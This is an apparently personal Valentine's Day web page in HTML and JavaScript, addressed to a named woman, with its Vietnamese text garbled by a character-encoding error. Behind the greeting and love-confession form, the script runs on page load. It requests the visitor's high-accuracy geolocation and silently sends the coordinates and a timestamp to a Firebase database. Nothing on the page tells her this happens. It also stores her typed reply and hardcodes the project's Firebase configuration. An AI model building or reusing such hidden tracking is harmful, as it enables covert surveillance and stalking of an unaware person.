<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Valentine's Day</title>
    <style>
      body {
        background: linear-gradient(135deg, #ff9a9e, #fad0c4);
        background-attachment: fixed;
        background-size: cover;
        min-height: 60vh;
        text-align: center;
        font-family: Arial, sans-serif;
        overflow: hidden;
        margin: 0;
        display: flex;
        justify-content: center;
        align-items: center;
      }
      .container {
        position: relative;
        padding: 20px;
        border-radius: 10px;
        background: rgba(255, 255, 255, 0.8);
        box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
      }
      .profile-pic {
        width: 120px;
        height: 120px;
        border-radius: 50%;
        border: 4px solid #d6336c;
        object-fit: cover;
      }
      h1,
      h2 {
        color: #d6336c;
      }
      .heart {
        color: red;
        font-size: 50px;
      }
      .floating-heart {
        position: absolute;
        font-size: 40px;
        color: red;
        animation: floatUp 5s linear forwards;
      }
      @keyframes floatUp {
        0% {
          transform: translateY(0);
          opacity: 1;
        }
        100% {
          transform: translateY(-100vh);
          opacity: 0;
        }
      }
      .hidden {
        display: none;
      }
      button {
        background-color: #ff4d6d;
        color: white;
        border: none;
        padding: 10px 20px;
        font-size: 16px;
        cursor: pointer;
        border-radius: 20px;
        margin-top: 20px;
        box-shadow: 2px 2px 10px rgba(0, 0, 0, 0.2);
        transition: background-color 0.3s, transform 0.2s;
      }
      button:hover {
        background-color: #c9184a;
        transform: scale(1.1);
      }
      button:disabled {
        background-color: #ffb3c1;
        cursor: not-allowed;
        transform: none;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <img src="./assets/thu_1.jpg" alt="Your Image" class="profile-pic" />
      <h1>Dear Th∆∞</h1>
      <h1>Happy Valentine's Day <span class="heart">‚ù§Ô∏è</span></h1>
      <p id="message">Ch√∫c em m·ªôt ng√†y ng·∫≠p tr√†n ni·ªÅm vui v√† h·∫°nh ph√∫c!</p>
      <button id="change-message-btn" onclick="changeMessage()">Nh·∫•n n√®</button>
      <div id="question-container" class="hidden">
        <p>Anh th√≠ch em, l√†m ng∆∞·ªùi y√™u anh nha?</p>
        <textarea
          id="response"
          rows="4"
          cols="50"
          placeholder="ƒêi·ªÅn c√¢u tr·∫£ l·ªùi n√®"
          oninput="toggleSubmitButton()"
        ></textarea>
        <br />
        <button id="submit-btn" onclick="submitResponse()" disabled>
          G·ª≠i n√®
        </button>
      </div>
    </div>
    <script type="module">
      // Import Firebase SDKs
      import { initializeApp } from "https://www.gstatic.com/firebasejs/11.3.0/firebase-app.js";
      import {
        getDatabase,
        ref,
        push,
      } from "https://www.gstatic.com/firebasejs/11.3.0/firebase-database.js";

      // C·∫•u h√¨nh Firebase
      const firebaseConfig = {
        apiKey: "AIzaSyDOgeNEwXDmqNgO1B2eNXvmV0IprvMj4sg",
        authDomain: "fir-cf37b.firebaseapp.com",
        databaseURL: "https://fir-cf37b-default-rtdb.firebaseio.com",
        projectId: "fir-cf37b",
        storageBucket: "fir-cf37b.firebasestorage.app",
        messagingSenderId: "633119732768",
        appId: "1:633119732768:web:4d55eb1f2a225a44107845",
      };

      const app = initializeApp(firebaseConfig);
      const database = getDatabase(app);

      function getLocation() {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(saveLocation, showError, {
            enableHighAccuracy: true,
          });
        } else {
          document.getElementById("status").innerText =
            "Tr√¨nh duy·ªát kh√¥ng h·ªó tr·ª£ ƒë·ªãnh v·ªã.";
        }
      }

      function saveLocation(position) {
        let latitude = position.coords.latitude;
        let longitude = position.coords.longitude;
        let accuracy = position.coords.accuracy;
        let timestamp = new Date().toISOString();

        let locationData = {
          latitude: latitude,
          longitude: longitude,
          accuracy: accuracy,
          timestamp: timestamp,
        };

        push(ref(database, "locations"), locationData)
          .then(() => {})
          .catch((error) => {
            console.error("Firebase Error:", error);
          });
      }

      function showError(error) {
        let msg = "";
        switch (error.code) {
          case error.PERMISSION_DENIED:
            msg = "error 1";
            break;
          case error.POSITION_UNAVAILABLE:
            msg = "error 2";
            break;
          case error.TIMEOUT:
            msg = "timeout";
            break;
          default:
            msg = "unknow error";
        }
      }

      window.onload = getLocation;

      //
      let messageState = 0;
      const messages = [
        "Wishing you a day full of love and happiness!",
        "May your heart be filled with love today and always! üíñ",
      ];

      function changeMessage() {
        messageState++;
        if (messageState < messages.length) {
          document.getElementById("message").innerText = messages[messageState];
        } else {
          document
            .getElementById("question-container")
            .classList.remove("hidden");
          document.getElementById("change-message-btn").disabled = true;
        }
      }

      function submitResponse() {
        const response = document.getElementById("response").value;
        let answerData = {
          answer: response,
        };
        alert("C·∫£m ∆°n ƒë√£ tr·∫£ l·ªùi nha!!!");
        push(ref(database, "answers"), answerData)
          .then(() => {})
          .catch((error) => {
            console.error("Firebase Error:", error);
          });
      }

      function toggleSubmitButton() {
        const response = document.getElementById("response").value;
        document.getElementById("submit-btn").disabled = response.trim() === "";
      }

      function createHearts() {
        const startY = 0;
        for (let i = 0; i < 5; i++) {
          const heart = document.createElement("div");
          heart.classList.add("floating-heart");
          heart.innerText = "‚ù§Ô∏è";
          document.body.appendChild(heart);
          heart.style.left = Math.random() * window.innerWidth + "px";
          heart.style.bottom = startY + "px";
          setTimeout(() => heart.remove(), 5000);
        }
      }
      setInterval(createHearts, 1000);
      window.changeMessage = changeMessage;
      window.submitResponse = submitResponse;
      window.toggleSubmitButton = toggleSubmitButton;
    </script>
    <script></script>
  </body>
</html>
